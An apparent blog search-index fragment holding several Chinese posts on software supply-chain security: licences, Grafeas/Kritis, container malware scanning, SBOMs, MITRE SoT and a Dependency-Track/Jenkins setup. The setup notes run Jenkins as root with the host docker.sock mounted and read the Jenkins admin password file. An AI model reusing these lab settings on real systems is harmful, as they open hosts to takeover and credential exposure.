license的限制。\n\n来源和衍生品必须在相同的版权条款下。\n如果你分发二进制文件，则必须提供源代码例子包括：GPL、Affero GPL（AGPL）、Lesser GPL（LGPL）、Mozilla Public License（MPL）、Eclipse Public License（EPL）和Common Development and Distribution License（CDDL）。\n\nPermissive宽松许可则相反，更大程度地减少著作权人限制，相对宽松\nweak Copyleft弱化的著佐权则是二者的中间态。\nCopyleft vs permissive二者的主要区别在于合规性要求以及如何“open”修改的代码。通常，permissive只要求使用者在重新发布代码时包含许可证文本和原始版权声明的副本即可。例如，开发人员可以获取代码，修改代码以创建一个新程序，然后将该程序的代码保留给自己，使其成为私有的或闭源代码，即使是将修改后的软件进行商业销售也是可以的。\n而copyleft则有更严格的条款规定。与permissive license一样，它们通常要求使用者继承原版权声明和许可文本，但还要求开发者在于原版相同的许可下，对二进制文件的所有接收者做出任何修改或衍生作品的源代码进行开源。\n如何选择开源软件的协议许可证\nSPDX Licsence List\n\n📚参考\nOpen Source Licenses by Category | Open Source Initiative\n[collect]如何选择开源许可证？ – ASPIRE\n\n","slug":"浅谈敏捷开发模式下银行业金融机构开源软件引入风险及管控举措","date":"2022-07-12T09:46:07.062Z","categories_index":"软件供应链安全","tags_index":"开源软件治理,开源软件引入","author_index":"Moses"},{"id":"82f3f8f0afc02942b9512346798bab47","title":"新技术调研可信云原生软件供应链-Grafeas和Kritis","content":"可信云原生软件供应链-Grafeas和kritis项目调研0x01背景在Google内部运行了大量的容器，每周需要部署超过20亿次容器(2019年5月数据， Software Supply Chain with Grafeas and Kritis ，我理解是每天需要创建3亿次容器) ，所以Google有巨大的压力需要了解容器内究竟发生了什么，部署了什么代码，哪些代码是自己开发的。\n\n\n\n\n\n\n\n\n\n任何一个巨型软件公司都使用了大量的开源、商用以及自研软件，就好比组装iPhone是由全世界不同供应商提供的零部件，你需要完整跟踪整个供应链，以确保质量和安全性。**由于软件开发中多语言的数据规范存在较大的差异，Groovy有自己定义的命名规范、Docker使用Sha256来表示每一层layer、Go语言使用URL定义自己的组件地址你可以将Grafeas+Kritis视为一个巨大的软件指纹库，来验证部署的源代码、软件状态、测试和安全记录。在InfoQ有一篇翻译介绍文章 使用“Grafeas”元数据 API 和“Kritis”部署授权管理软件供应链\n当你编写了代码，构建了镜像以及容器，并且测试和验证了二进制代码，然后通过QA测试最终部署到生产环境。这个过程由持续集成CI pipelines自动完成。你依然需要检查你的发布包中所包含的第三方依赖，因为你只控制了自己编写的程序代码部分，如果没有第三方依赖的功能、安全检查，你依然无法信任自己发布的软件包是安全可靠的。\nGoogle开发了Grafeas和Kritis，通过开放的metadata(元数据)标准，定义如何构建元数据和测试元数据，并且作为一个中心化的元数据知识库，包含了你的最终产品所使用的变量以及编译信息。可以通过配置策略控制和查看修改，然后通过Kritis(管理控制器)部署到Kubernetes中，就可以运行集群管理定义，在某些pod加载是检查镜像中的服务漏洞以及镜像来源，如果不符合管理定义策略，就会拒绝加载pod。\n\n\n\n\n\n\n\n\n\nGrafeas是中心化元数据存储中心；Kritis是运行在Kubernetes集群中的管理控制器。Kritis是通过Grafeas提供的API来读取元数据信息，然后对容器进行策略检查\n\n0x02Grafras元数据安全审计GitHub - grafeas&#x2F;grafeas: Artifact Metadata APIGrafeas 起源于容器的安全性质量控制，但从定义来看它并不局限于容器。它是提供统一方式来审计，监控软件组件的开源工件元数据 API。 这里的’Software’可以是 Docker 镜像，也可以是 War，Jar 和 Zip 包，’Supply Chain’ 指的是构建这些发布包所包含的组件。Grafeas是由IBM与谷歌合作推出的。Grafeas提供了两种元数据的api，notes和occurrences：Projects：是notes和occurrences的存储库。  \n\nNotes：是有关软件构件的某些方面的细节。这可以是对已知软件漏洞的描述，关于如何构建软件的细节(构建版本，它的校验和等等)，以及它部署的历史等等。  \nOccurrences：是notes的实例，其中详细描述了它们是如何创建的，以及它们是如何创建的。例如，一个已知的软件漏洞的细节，可能会出现描述哪个漏洞扫描器在检测到它时检测到的信息，以及该漏洞是否被处理过。\n\nNotesnotes描述了元数据的上层描述。举例，你可以在分析了一个Linux软件包之后创建一个有关特定安全漏洞的note。你可以使用这个note来存储有关一个编译进程的编译器信息。note通常由执行这个分析的provider来拥有和创建。可以通过分析以及跨不同项目发生多次来生成notes。\nnote的名字必须按照格式 /projects/&lt;project_id&gt;/notes/&lt;notes_id&gt; 。这里note ID是对每个项目唯一，并且尽可能提供信息。例如，漏洞note对名字可以是 CVE-2013-4869 以引用它所描述对CVE。\n通常应该将note和occurrences存储到各自独立对项目，这样可以使用精细控制的访问权限来管理。note只能由note的owner编辑，并且只对具有访问引用occurrences的用户只读。\nOccurrences(存在)occurrence是note的执行实体(实例&#x2F;instantiation)。occurrences描述了给定note的特定对象。例如，有关一个漏洞的note的occurrence将会描述在哪个软件包中发现漏洞，指定补救步骤(remediation steps)。或者，一个有关编译详情的note的occurrence会描述一个编译的生成的容器镜像。\n0x03 KritisKritis是一个拟议的软件供应链管理框架，它允许使用存储于Grafeas中的元数据与Kubernetes构建和实施实时部署策略，这可以避免发布存在已知问题的容器镜像。kritis-validation-hook组件是部署可信容器环节中进行容器镜像签名验证的关键组件。通过在部署前对容器镜像进行签名验证可以确保只部署经过可信授权方进行过签名的容器镜像，降低在环境中运行意外或恶意代码的风险。\nKritis的使用是验证型admission webhook，这是在接收到admission请求以后的HTTP回调，就能够根据定制的admission策略来决定我们是否接受或者拒绝这个请求。GitHub - grafeas&#x2F;kritis: Deploy-time Policy Enforcer for Kubernetes applications\n0x04架构图\n0x05总结总的来说Grafeas这个项目还有不少工作要做，但是对于最核心的部分，软件供应链建模以及相对应的API，项目设计得比较妥当，担得上「A Component Metadata API」这个称号。这个感觉类似于Google在CI&#x2F;CD云原生领域的Tekton项目，同样是靠出色的建模脱颖而出。而且有意思的是这两个项目都出自Google，而不是垂直行业里的老大JFrog&#x2F;Jenkins，反而是等Google推出后，JFrog&#x2F;Jenkins不约而同地加入了Google的Grafeas&#x2F;Tekton项目。\nReferencesKubernetes 时代的安全软件供应链-阿里云开发者社区\n","slug":"可信云原生软件供应链-Grafeas和kritis项目调研","date":"2022-07-12T03:19:54.198Z","categories_index":"软件供应链安全","tags_index":"软件供应链安全,云原生安全,新技术调研","author_index":"Moses"},{"id":"de32a1a96e94010ffce347f9070bfa2b","title":"云原生恶意软件扫描","content":"云原生恶意软件扫描0x01简介YaRadare可以对容器镜像、正在运行的docker容器和系统文件中找到恶意软甲威胁的事件。使用 YARA ruleset识别资源匹配恶意软件签名。\n0x02架构图略\n0x03核心能力\nAt rest: scan local container images, for example, before they are deployed, to verify they do not contain malware\nAt runtime: scan running docker containers, for example, if you observe unusual network traffic or CPU activity\nAgainst filesystems: at any time, YaRadare can scan a local filesystems for indicators of compromise\n\nKey capabilities:\n\nScan running and at-rest containers, and filesystems\nRun anywhere: highly-portable, docker container form factor or universal GO binary work in progress\nDesigned for automation: easy-to-deploy, easy-to-parse JSON output\n\n0x04对比略\n0x05Quickstartbuild yaRadredocker build --rm&#x3D;true --tag&#x3D;deepfenceio&#x2F;deepfence-yaradare:latest -f Dockerfile .\n\n扫描容器镜像\ndocker pull node:latest\n\ndocker run -it --rm --name&#x3D;deepfence-yaradare \\\n    -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock \\\n    deepfenceio&#x2F;deepfence-yaradare:latest --image-name node:latest\n\ndocker rmi node:latest\n\n扫描运行的容器docker run -it --rm --name&#x3D;deepfence-yaradare \\\n    -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock \\\n    -v &#x2F;:&#x2F;deepfence&#x2F;mnt \\\n    deepfenceio&#x2F;deepfence-yaradare:latest \\\n    --host-mount-path &#x2F;deepfence&#x2F;mnt --container-id 69221b948a73\n\n扫描系统文件docker run -it --rm --name&#x3D;deepfence-yaradare \\\n    -v ~&#x2F;src&#x2F;YARA-RULES:&#x2F;tmp&#x2F;YARA-RULES \\\n    deepfenceio&#x2F;deepfence-yaradare:latest \\\n    --local &#x2F;tmp&#x2F;YARA-RULES --host-mount-path &#x2F;tmp&#x2F;YARA-RULES\n\n","slug":"云原生恶意软件扫描","date":"2022-07-08T03:50:32.192Z","categories_index":"Cloud-Native-Security","tags_index":"恶意文件软件扫描,DevSecOps,yara-scanner,threat-hunting,ioc","author_index":"Moses"},{"id":"ff9f99b916729c965fcce33c1ab740e6","title":"概念梳理-软件供应链清单SBOM","content":"概述和背景软件供应链安全始于对关键环节的可见性，企业需要为每个应用程序持续构建详细的 SBOM（Software Bill of Material，软件物料清单），从而全面洞察每个应用软件的组件情况。SBOM 是描述软件包依赖树的一系列元数据，包括供应商、版本号和组件名称等多项关键信息，这些信息在分析软件安全漏洞时发挥着重要作用。\n上表是一份软件物料清单示例，其中 SPDX 和 SWID 是两种国际通用的 SBOM 字段标准。\n\nSPDX（The Software Package Data Exchange，软件包数据交换）是 Linux 基金会下的开放性标准，其用于交流软件物料清单信息，包括组件、许可证、版权等信.SPDX 通过为公司和社区共享重要数据提供通用格式来减少冗余工作，从而简化 流程并提高合规性。\nSWID（Software Identification，软件标识）标签旨在为组织提供一种透明的方式来跟踪在他们的托管设备商安装的软件，它于 2012 年由 ISO 提出，并于 2015 年更新为 ISO&#x2F;IEC 19770-2:2015。SWID 标签文件包含有关软件产品特定版本详尽的描述性信息。除表格中的两种应用最为广泛的 SBOM 字段标准外，还有 CycloneDX、CoSWID、CPE、Grafeas 等其他较为常见的标准，各标准的应用场景存在一定的区别。 \nCycloneDX:专为安全上下文和供应链组件分析而构建。核心团队由OWASP、Sonatype和serviceNow的人领导。\n\nSBOM 的概念源自制造业，其中物料清单是详细说明产品中包含的所有项目的清单。例如：在汽车行业，制造商会 为每辆车维护一份详细的材料清单。此 BOM 列出了原始设备制造商自己制造的零件和第三方供应商的零件。当发现有缺陷的部件时，汽车制造商可以准确地知道哪些车辆受到影响，并可以通知车主维修或更换。\n同样，构建软件的企业也需要维护准确、最新的 SBOM，其中包括第三方和开源组件的清单，以确保其代码质量高、合规且安全。企业通过要求软件供应商提供 SBOM，以发现潜在的安全和许可证问题，或者应用程序是否使用过 时的库版本。\n当发现此类问题时，管理员可以要求供应商使用较新版本重建应用程序，在等待更新的软件期间，安全人员有机会采取临时缓解措施来保护应用程序免受攻击者利用该漏洞进行攻击，还可以帮助安全人员在漏洞 被披露或核心库发布新版本时 , 对应用程序和代码进行抽查以避免出现安全问题。\n举个例子：如果安全人员手中有一份在其环境中运行的每个应用程序的物料清单，那么早在 2014 年 4 月，当 Heartbleed 漏洞最初被披露时，安全人员就无需测试每个应用程序中是否包含 OpenSSL，而是可以通过检查列表 就立即知道哪些应用程序依赖于易受攻击的版本和需要采取的措施。\nSBOM生产流程在成熟的体系下，SBOM 的生产可以通过软件生命周期每个阶段所使用的工具和任务流程化地完成，这些工具和 任务包括知识产权审计、采购管理、许可证管理、代码扫描、版本控制系统、编译器、构建工具、CI&#x2F;CD 工具、包管理器和版本库管理工具等SBOM 中应该包含软件组件与此组件所依赖的任何其他基础软件组件之间的关系。软件产品在发布任何版本时， SBOM 都应作为产品文档的一部分被提供，在 CI&#x2F;CD 的标准实践中，SBOM 中包含的信息将不断更新。它从在需求中集成安全性需求开始，或者是 SBOM 中的一些元素已经在需求阶段被添加到用例中，这样安全性和 SBOM 就可以成为 DevOps 过程的标准和结构化的一部分。 \n为了确保持续一致性，应在测试工作中将 SBOM 作为测试用例的一部分，同时 SBOM 信息应随着使用工具和组 件的更新而更新，使 SBOM 信息自动更新成为 CI&#x2F;CD 管道中每个构建周期标准的一部分。在发布运营阶段使用 SBOM 可以在使用的库或组件存在漏洞时，以更快的时间检测出有哪些应用程序中存在这些漏洞，并及时进行修复工作。\nSBOM可提高软件供应链的透明度尽管 SBOM 对许多人来说依然很陌生，但其需求却不断呈现增长态势。Gartner 在其 2020 年的“应用程序安全测 试魔力象限”中预测到：“到 2024 年，至少一半的企业软件买家要求软件供应商必须提供详细的、定期更新的软 件物料清单，同时 60% 的企业将为他们创建的所有应用程序和服务自动构建软件材料清单，而这两组数据在 2019 年都还不到 5%。” \n现代软件是使用第三方组件组装而成的，它们以复杂而独特的方式粘合在一起，并与原始代码集成以实现企业所 需要的功能。在现代多层供应链中，单个软件可能有成百上千的供应商，从原材料来源到最终组装系统的全套供 应商中找出某一组件的来源需要花费大量的时间和精力。因此，为所有组件构建详细准确的 SBOM，帮助企业跟 踪当前运行的程序、源代码、构建依赖项、子组件等所依赖组件的使用情况，检测软件组件是否带有已知的安全漏洞或功能漏洞。SBOM 有助于揭示整个软件供应链中的漏洞与弱点，提高软件供应链的透明度，减轻软件供应链攻击的威胁。通过 使用 SBOM 可以帮助企业进行漏洞管理、应急响应、资产管理、许可证和授权管理、知识产权管理、合规性管理、 基线建立和配置管理等\n通过自动化创建 SBOM 可以在漏洞披露时及时地进行响应排查以及快速的安全修复，最小化软件供应链的安全风 险；在开源组件和版本快速迭代的情况下，从风险管理的角度跟踪和持续监测闭源组件和开源组件的安全态势； \n同时 SBOM 列举了管理开源组件的许可证，可以保护企业免受不当使用相关的法律或知识产权的风险，保护应用 程序在软件供应链中的合规性，避免将已知缺陷传递到软件供应链的下游。\nSBOM为漏洞风险治理节省大量时间SBOM 的使用可以为软件供应链的漏洞治理节省大量时间。及时性对于企业在漏洞修复时是非常重要的。以往，企业在修复已部署系统的漏洞缺陷时往往需要几个月甚至是数年的时间，其重要原因之一是企业无法在漏洞出现 的第一时间知晓该信息。\n软件供应链下游的企业需要等待上游软件供应商完成软件补丁，才可以进行漏洞修复， 在等待的时间内，下游企业往往会面临无法预知的安全风险。而构建详细准确的 SBOM 则可以避免这一现象的发生， 允许所有利益相关者在漏洞发现时立即开始评估漏洞，并开始制定相关的补救措施。以下通过一张对比图来说明 SBOM 对漏洞风险治理时间的影响。受感染的开源组件在软件中未被修复的每一分钟都会增加潜在被利用的风险，SBOM 有助于企业在漏洞披露的早期 对漏洞进行识别，通过 SBOM 提供受感染开源组件和依赖项的准确位置，采取适当的步骤进行修改，为企业在风 险分析、漏洞管理和补救过程中节省数百小时至数月的时间。\nReferences\n📒浅谈软件供应链安全治理与应用实践（内附报告下载地址） - 知乎\nScan docs\n🔧GitHub - CycloneDX&#x2F;cyclonedx-cli: CycloneDX CLI tool for SBOM analysis, merging, diffs and format conversions.\n🔧Guiding Principles\n🔧Code Dx Application Vulnerability Correlation | Synopsys\n🔧GitHub - grafeas&#x2F;grafeas: Artifact Metadata API\n🔧GitHub - grafeas&#x2F;kritis: Deploy-time Policy Enforcer for Kubernetes applications\n📒开源安全危机的特效药：SBOM - 知乎\n📒OpenSSF安全计划：SBOM将驱动软件供应链安全 - 知乎\n\n","slug":"软件物料清单SBOM","date":"2022-06-29T09:33:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,SBOM","author_index":"Moses"},{"id":"89d77735267b5346cef8f56cdc08f0d1","title":"供应链安全可信系统技术框架","content":"供应链安全可信系统技术框架概述和背景NIST发布了《网络安全软件供应链安全管理实践》（Cybersecurity Supply Chain Risk Management Practices for Systems and Organizations ）[[NIST网络安全软件供应链安全管理实践]]将美国政府自2019年供应链安全战略发布以来的优秀案例实践加以汇总，整理出了针对供应链安全管控的实现方法与操作路线图。与此同时，MITRE作为美国的官方智库部门，同步推出了自身的供应链安全系统可信技术框架——MITRE SoT™，框架内容在NIST发布的官方文档中占据了大比例篇幅，并作为官方主推的供应链安全管理架构在行业内进行推广.\n建设目标MITRE此次发布的SoT™，完整表述应为供应链安全可信系统技术框架，英文是Supply Chain Secruity（SCS）System of Trust (SoT) Framework，旨在提供一种战略性的、可广泛采用的、全面的、数据驱动的评估供应链安全风险的分析技术框架与评估平台。MITRE将供应链可信评估的基础风险维度分为三个方向，供应商、供应品、服务。其下包含有12个涉及信任度的最高级决策性风险域，机构或企业在进行其收购活动的整个生命周期内必须对上下游进行评估并据此选择。SoT框架深入分析这12个最高级风险域，调查了多达76个风险子领域并对400多个详细问题进行研究。在最新的风险域划分中已将服务风险从原来的接触式服务&#x2F;非接触式服务细化为4个风险子域。整体数量上升到14个（最新版为表1）。在2020年末，MITRE开展了一组初步的试点评估并达到了预期效果。SoT框架的定位是为了让需求方就是否从某个特定供应商那里购买产品和服务或是否从供应商购买特定的产品和服务，做出一个清晰而明智的决定。\nMITRE SoT™评级方法与技术框架SoT Body of Knowledge(SoT BoK)：SoT BoK是MITRE基于数十年的供应链安全经验、对重要采购群体面临的复杂挑战的深刻见解，以及社区对供应链的广泛认识，所制定的应对供应链安全的可信系统知识库。SoT BoK能够扩展用于不同的行业、组织和供应链领域类型。SoT BoK使用了知识图谱方式管理知识结构，从公开资料能看到，目前最高级域包括供应商、供应品和服务，如下表所示。\n\n\n\n风险类别\n定义\n\n\n\n供应商\n与产品服务商的特征（包括其供应商）相关的风险，这些风险可能会影响这些产品或服务的消费者\n\n\n供应品\n供应品，及产品。此类相关风险包括其供应链的来源和血统，可能会影响这些产品的消费者\n\n\n服务业\n与服务特征相关的风险，包括其供应链和血统，可能会影响涉及相关服务的消费者\n\n\n三类展开的技术框架如下图，具体类型如下表\n\n\n\n风险类别\n定义\n\n\n\n外部影响\n指与供应商特征相关的风险。其可能会潜在增加供应商受外部动机或效忠的负面影响。在民族国家背景下，风险通常是指受外国影响的问题；在商业环境中，风险通常是指竞争对手对供应商的影响。\n\n\n金融稳定\n与供应商的财务健康和稳定性特征相关的风险，其可能会影响供应商长期的生存，运营，诚信，增长，技术进步和持续的供应&#x2F;服务交付。\n\n\n恶意\n与供应商特征相关的风险，其可能通过明确的意图（无论是内部还是外部驱动），对客户，合作伙伴或市场造成负面影响，比如违反法律&#x2F;业务规范或造成伤害。\n\n\n组织安全\n与供应商的员工、设备、运输和网络安全能力、政策和实践的特征相关的风险，其会影响供应商抵抗恶意行为及其对客户的影响的潜力。\n\n\n组织声望\n与供应商的地理、地缘政治、结构或运营特征相关的风险，其会影响供应商以有效和弹性方式运营的潜力。\n\n\n质量文化\n与供应商可靠地交付优质供应品和服务的能力特征相关的风险。\n\n\n敏感性\n与供应商特征（工业部门、位置、客户等）相关的风险，包括主动管理那些可能被恶意分子针对，攻击，或附加其他负面影响并危害到客户的风险。\n\n\n\n\n\n风险类别\n定义\n\n\n\n仿冒\n与供应品（产品）或服务的真实性有关的风险。\n\n\n健康度\n影响供应品（产品）或服务按预期执行能力的风险。这涉及与质量，安全性，恢复力等相关的特征。\n\n\n恶性漏洞\n与供应品（产品）或服务的完整性相关的风险。\n\n\n\n\n\n风险类别\n定义\n\n\n\n所提供服务的完整性\n与服务原封不动地交付相关的风险。\n\n\n所提供服务的质量\n与按指定交付的服务相关的风险。\n\n\n所提供服务的可靠性\n与所提供服务的一致性相关的风险。\n\n\n所提供服务的安全性\n与在面对恶意操作时按预期交付的服务相关的风险。\n\n\nSoT BoK的知识图谱结构展示如下：\n软件供应商风险管理流程软件供应商风险是指与第三方供应商相关的任何可能影响企业利益或资产的固有风险。在选择第三方软件供应商 时，为了避免因引入第三方供应商而带来众多潜在的安全风险，需要稳健的流程来识别和管理日益增加的软件供 应商风险。因此，企业亟需构建有效且稳健的软件供应商风险管理流程。 \n构建完整的软件供应商风险管理流程可以提高软件供应链的透明度，同时帮助企业实现降低采购成本、识别和减 轻供应商相关风险以及对软件供应商风险管理系统的持续优化改进。以下是针对软件供应商基本风险管理流程\n\n标准确立：结合企业的实际情况，构建软件供应商评估模型，制定软件供应商考核的评估标准及安全框架； \n\n资格评估：根据制定的软件供应商评估模型和相关标准，对初步符合要求的软件供应商进行多维度的综合性资格评估，选出匹配度最高的供应商； \n\n风险评估：对通过资格评估的软件供应商进行安全风险评估，针对软件供应商面临的潜在的安全风险、存在的弱点 以及有可能造成的影响综合分析其可能带来的安全风险进行评估； \n\n风险监控：对软件供应商实施长期性的安全风险监控，持续识别和管理软件供应商的安全风险，根据监测结果实施更新软件供应商的风险管理策略。\n\n\n软件供应商评估模型为了确保企业可以拥有较为稳定的供应链，提高企业的综合竞争力，经过多方面的综合考察分析，以下构建了一 个系统化、结构化的软件供应商评估模型以供参考。软件供应商评估模型的关键意义在于从不同的维度对软件供 应商进行评估，通过考察软件供应商的综合实力，以选择最合适的合作伙伴。以下是通过十二种不同维度对软件 供应商评估的全过程\n\n财务实力：评估软件供应商的财务能力以及稳定性，确保供应商具有稳定性和可靠性来提供业务所需要的服务； \n\n质量承诺：评估软件供应商的相关软件产品是否符合国家及行业标准要求，信息安全和数据保护控制流程必须遵 守法律、监管或合同义务以及任何行业标准的信息安全要求； \n\n企业资质：评估软件供应链上的第三方供应商是否能够提供软件安全开发能力的企业级资质，是否具备国际、国家或行业的安全开发资质，在软件安全开发的过程管理、质量管理、配置管理、人员能力等方面是否具备一定的经验，具有把安全融入软件开发过程的能力； \n\n技术储备：评估软件供应商是否拥有自主研发能力以及自主技术知识产权，对科技知识是否有进行不断的积累和及时更新，对企业提高技术水平、促进软件生产发展是否有开展一系列的技术研究； \n\n合作能力：评估软件供应商是否拥有高效的沟通渠道以及全面的解决方案，拥有共同的价值观和工作理念有助于建立长期的合作关系； \n\n软件交付能力：评估软件供应商在整个软件及信息服务交付的过程中，是否能满足软件持续性交付的要求；\n\n应急响应能力：评估软件供应商从软件开发到运营阶段是否持续实行实时监控机制，是否有利用适当的网络和基 于端点的控制来收集用户活动、异常、故障和事件的安全日志，是否具有适当的业务连续性和恢复能力，以防止或减轻业务中断和相关影响； \n\n服务能力：评估软件供应商的售前服务能力、培训服务能力以及售后维护服务能力是否满足企业的要求，在合作 期间内是否可以始终如一的提供高水平的质量和服务；\n\n创新能力：评估软件供应商的综合创新能力，包括技术创新能力、研究开发能力、产品创新能力以及生产创造力等；\n\n内部管理能力：评估软件供应商是否拥有完善的内部管理制度流程、有效的风险防范机制以及是否对员工定期进行安全培训等，对供应商内部安全开发标准和规范进行审查，要求其能够对开发软件的不同应用场景、不同架构设计、不同开发语言进行规范约束，审查软件供应商对其自身信息安全保密程度； \n\n软件成本：评估软件供应商所提供的软件成本是否存在虚报等现象，审查产品及相关服务是否可以按照合理的价格交付； \n\n软件适用性：评估软件在开发部署以及动态运行时的适用性，是否可以持续满足新的需求。\n\n\n软件供应商管理的作用通过对软件供应商风险管理有助于企业更加高效准确地控制软件供应商带来的新的安全风险，以下是软件供应商风险管理的具体作用：-降低风险：通过对软件供应商进行彻底的审查可以识别其可能对业务构成的安全威胁的任何潜在弱点，根据软件供应商对企业业务的影响确定漏洞的重要性； \n\n降低成本：通过对软件供应商风险进行充分的评估，可以以主动而非被动的方式应对安全威胁，减少潜在的安全风险，避免网络安全攻击或其他数据泄露等问题给企业造成的财务损失； \n\n提高效率：通过对软件供应商进行实时风险监控，可以提前预知风险并及时做出响应，提高企业处理安全风险的 效率； \n\n培养长期合作关系：通过对供应商风险的管理、评估和跟踪监控，加强对供应商健康状况的监督，有助于培养可靠的长期合作关系。\n\n\nReferences\nSystem of Trust™\nAddressing Supply Chain Security Risks: MITRE’s System of Trust™ | RSA Conference\n\n","slug":"供应链安全可信系统技术框架","date":"2022-06-29T08:43:00.000Z","categories_index":"软件供应链安全","tags_index":"软件供应链安全,技术框架","author_index":"Moses"},{"id":"afb19c047533022f884066f88b6a2608","title":"软件供应链安全分析工具-Dependency-Track","content":"dependency-track概述和背景[[SCA软件成分分析前期探索#OWASP Dependency-Track]]\n部署DTquick-start[[SCA软件成分分析前期探索#部署]]docker安装版本为V3.8.0\nK8S部署helm-charts前期准备：安装SC\n\n快速使用[[longhorn]]\n\n设置默认存储类\nkubectl patch storageclass longhorn -p &#39;&#123;&quot;metadata&quot;: &#123;&quot;annotations&quot;:&#123;&quot;storageclass.kubernetes.io&#x2F;is-default-class&quot;:&quot;true&quot;&#125;&#125;&#125;&#39;\n使用Helm v3安装\nhelm repo add evryfs-oss https:&#x2F;&#x2F;evryfs.github.io&#x2F;helm-charts&#x2F;\nhelm install dependency-track evryfs-oss&#x2F;dependency-track --namespace dependency-track --create-namespace\n创建路由\n\n配置config.json\n&#x2F;app&#x2F;static $ cat config.json\n&#123;\n  &quot;API_BASE_URL&quot;: &quot;http:&#x2F;&#x2F;dt-api.kubegems.io:32126&quot;,\n  &quot;OIDC_ISSUER&quot;: &quot;&quot;,\n  &quot;OIDC_CLIENT_ID&quot;: &quot;&quot;,\n  &quot;OIDC_SCOPE&quot;: &quot;openid profile email&quot;,\n  &quot;OIDC_FLOW&quot;: &quot;&quot;,\n  &quot;OIDC_LOGIN_BUTTON_TEXT&quot;: &quot;&quot;\n&#125;\n测试登录-修改密码-创建测试项目.漏洞分析及依赖图谱如下：\n\n\n\n\n一段事件后backend服务出现装载卷失败(也有可能是CPU的问题)Dependency Track High CPU Behaviour · Issue #264 · DependencyTrack&#x2F;dependency-track · GitHub，尝试各种回滚、扩容等方式失败后重新部署，重新部署可能是Longhorn的PV卷未删除导致安装失败，不能创建PVC。修改value文件后重新安装成功。# 下载chart\nhelm fetch evryfs-oss&#x2F;dependency-track\n# 解压\ntar -zxf dependency-track-1.4.0.tgz\n# 修改value.yaml文件，更换SC，使用local-path\nvi value.yaml \n# 修改postgresql的部署文件，更换sc,使用local-path\nvim deployment.yaml\n# 重新安装\nhelm install -f values.yaml dependency-track . --namespace dependency-track --create-namespace\n\nDT更换数据库Dependency-Track更换数据库文档适用于docker部署，K8S暂未研究\nSBOM[[软件物料清单SBOM]]CycloneDX工具CycloneDX Tool Center\ncdxgen\n项目地址cdxgen\n官网Scan docs\n\n安装测试xfxj01@moses  ~&#x2F;Downloads  nvm install v16.15.1\nxfxj01@moses  ~&#x2F;Downloads  npm install -g @appthreat&#x2F;cdxgen\n\n使用场景使用场景和更多的功能为深入研究，详见官网\nCycloneDX Maven Plugin在项目pom文件的plugin中引入\n&lt;plugin&gt;\n\t\t\t\t&lt;groupId&gt;org.cyclonedx&lt;&#x2F;groupId&gt;\n\t\t\t\t&lt;artifactId&gt;cyclonedx-maven-plugin&lt;&#x2F;artifactId&gt;\n\t\t\t\t&lt;version&gt;2.5.1&lt;&#x2F;version&gt;\n\t\t\t\t&lt;executions&gt;\n\t\t\t\t\t&lt;execution&gt;\n\t\t\t\t\t\t&lt;phase&gt;package&lt;&#x2F;phase&gt;\n\t\t\t\t\t\t&lt;goals&gt;\n\t\t\t\t\t\t\t&lt;goal&gt;makeAggregateBom&lt;&#x2F;goal&gt;\n\t\t\t\t\t\t&lt;&#x2F;goals&gt;\n\t\t\t\t\t&lt;&#x2F;execution&gt;\n\t\t\t\t&lt;&#x2F;executions&gt;\n\t\t\t\t&lt;configuration&gt;\n\t\t\t\t\t&lt;projectType&gt;library&lt;&#x2F;projectType&gt;\n\t\t\t\t\t&lt;schemaVersion&gt;1.3&lt;&#x2F;schemaVersion&gt;\n\n\t\t\t\t\t&lt;includeBomSerialNumber&gt;true&lt;&#x2F;includeBomSerialNumber&gt;\n\n\t\t\t\t\t&lt;includeCompileScope&gt;true&lt;&#x2F;includeCompileScope&gt;\n\n\t\t\t\t\t&lt;includeProvidedScope&gt;true&lt;&#x2F;includeProvidedScope&gt;\n\n\t\t\t\t\t&lt;includeRuntimeScope&gt;true&lt;&#x2F;includeRuntimeScope&gt;\n\n\t\t\t\t\t&lt;includeSystemScope&gt;true&lt;&#x2F;includeSystemScope&gt;\n\n\t\t\t\t\t&lt;includeTestScope&gt;false&lt;&#x2F;includeTestScope&gt;\n\n\t\t\t\t\t&lt;includeLicenseText&gt;false&lt;&#x2F;includeLicenseText&gt;\n\n\t\t\t\t\t&lt;outputFormat&gt;all&lt;&#x2F;outputFormat&gt;\n\n\t\t\t\t\t&lt;outputName&gt;bom&lt;&#x2F;outputName&gt;\n\n\t\t\t\t&lt;&#x2F;configuration&gt;\n\n\t\t\t&lt;&#x2F;plugin&gt;\n\nCycloneDX BOMs RepoDT不支持存储原始BOM文件，可以使用BOM Repo进行存储cyclonedx-bom-repo-server使用docker部署\n# 本地测试\ndocker run --env REPO__DIRECTORY&#x3D;&#x2F;repo --env ALLOWEDMETHODS__GET&#x3D;&quot;true&quot; --env ALLOWEDMETHODS__POST&#x3D;&quot;true&quot; --env ALLOWEDMETHODS__DELETE&#x3D;&quot;true&quot; --tty --interactive -p 8000:8080 cyclonedx&#x2F;cyclonedx-bom-repo-server\n# 持久化存储\nmkdir repo\ndocker run --volume &quot;$(pwd)&#x2F;repo&quot;:&#x2F;repo --env REPO__DIRECTORY&#x3D;&#x2F;repo --env ALLOWEDMETHODS__GET&#x3D;&quot;true&quot; --env ALLOWEDMETHODS__POST&#x3D;&quot;true&quot; --env ALLOWEDMETHODS__DELETE&#x3D;&quot;true&quot; --tty --interactive -p 8000:8080 cyclonedx&#x2F;cyclonedx-bom-repo-server\n\n安装Jenkins测试环境docker run -d -p 8222:8080 -u root  -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock jenkinsci&#x2F;blueocean:latest\n# 初始密码\ncat &#x2F;var&#x2F;jenkins_home&#x2F;secrets&#x2F;initialAdminPassword\n安装CI&#x2F;CD插件\n安装OWASP Dependency-Track插件\n\n系统配置\n\n配置maven及JDK环境变量\n\nbuild测试\ncd hctc-auditor-message-master-42d51509695f2e19d602bfed846d71b052151176\n# 打包\nmvn clean install -D mvn.test.skip&#x3D;true\n# 生成bom.xml文件\nmvn org.cyclonedx:cyclonedx-maven-plugin:makeBom\n\n\n构建后操作\n\n\n\n在【Build】处选择“Execute Shell”，然后输入构建语句，并添加mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom生成sbom文件\n在【Post-build Actions】处选择“Publish BOM to Dependency-Track”,填写project name 和 project 